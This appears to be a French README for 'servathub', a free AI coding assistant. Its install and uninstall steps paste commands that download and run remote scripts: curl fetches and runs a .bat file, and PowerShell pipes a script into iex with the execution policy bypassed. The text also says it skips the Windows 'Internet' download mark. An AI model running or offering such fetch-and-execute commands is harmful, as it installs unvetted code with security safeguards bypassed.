# servathub

Assistant de codage IA gratuit basé sur l'interface de chat, avec le modèle **DeepSeek V4 Flash (Unlimited)** et sans aucune publicité.

- 🚫 Aucune pub
- 🔓 Modèle unique : DeepSeek V4 Flash — illimité
- 🔑 Chaque utilisateur se connecte avec son propre compte (gratuit)

## Installation (Windows) — commande simple

Ouvre un **invite de commandes (cmd)** et colle :

```cmd
curl -fsSL https://raw.githubusercontent.com/tiktokservat7-stack/servathub/main/install.bat -o "%TEMP%\sv-install.bat" && "%TEMP%\sv-install.bat"
```

C'est l'équivalent Windows de `curl | bash` : le script télécharge `servathub.exe` + `tree-sitter.wasm` (via curl, sans barre de progression ni marque « Internet »), les installe dans `%USERPROFILE%\servathub`, ajoute le dossier au PATH et ferme automatiquement une ancienne version si elle tourne.

Puis **ouvre un nouveau cmd** et tape :

```cmd
servathub
```

### Alternative (PowerShell)

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/tiktokservat7-stack/servathub/main/install.ps1 | iex"
```

## Désinstallation (Windows)

Ouvre un **invite de commandes (cmd)** et colle :

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/tiktokservat7-stack/servathub/main/uninstall.ps1 | iex"
```

Le script ferme servathub s'il tourne, supprime le dossier `%USERPROFILE%\servathub` et retire l'entrée du PATH. Ouvre ensuite un nouveau cmd pour que le PATH soit à jour.

## Manuel

- L'installeur copie les fichiers dans `%USERPROFILE%\servathub` et ajoute ce dossier au PATH de l'utilisateur.
- Au premier lancement, connecte-toi avec un compte gratuit sur freebuff.com (la page de connexion s'ouvre toute seule).

## Remarque

`servathub.exe` doit toujours rester à côté de `tree-sitter.wasm` (fichier requis au démarrage).
